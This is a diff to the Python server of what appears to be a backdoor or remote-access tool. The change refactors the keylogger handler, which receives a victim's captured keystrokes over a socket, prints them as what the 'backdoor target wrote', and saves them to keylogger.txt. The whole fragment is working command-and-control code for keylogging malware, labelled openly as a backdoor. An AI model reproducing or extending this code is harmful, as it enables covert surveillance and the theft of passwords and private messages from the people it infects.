@@ -37,24 +37,23 @@ def handle_print_screen(client):
         client.close()
         
 def handle_keylogger(client):
-    while True:
-        print("[+] Receiving the keylogger from client each 10 seconds")
-        # WRITE KEYLOGGER BACKDOOR
-        with open('keylogger.txt', 'wb') as arquivo:
-            while True:
-                data = client.recv(1024)  
-                # CONNECTION IS OVER
-                if not data:
-                    break
-                # PRINT ONLY IF THERE IS MESSAGE
-                if data != '':
-                    print("[+] Backdoor target wrote:\n→ ", data.decode('utf-8'))
-                arquivo.write(data)
+    print("[+] Receiving the keylogger from client each 10 seconds")
+    # WRITE KEYLOGGER BACKDOOR
+    with open('keylogger.txt', 'wb') as arquivo:
+        while True:
+            data = client.recv(1024)  
+            # CONNECTION IS OVER
+            if not data:
+                break
+            # PRINT ONLY IF THERE IS MESSAGE
+            if data != '':
+                print("[+] Backdoor target wrote:\n→ ", data.decode('utf-8'))
+            arquivo.write(data)
 
-        # CLOSE CONNECTION WITH CLIENT
-        client.close()
+    # CLOSE CONNECTION WITH CLIENT
+    client.close()
         
-        print(f"\n[+] Client keylogger disconnected. The file was received and saved as keylogger.txt")
+    print(f"\n[+] Client keylogger disconnected. The file was received and saved as keylogger.txt")
 
 
 def handle_clients(client, id):
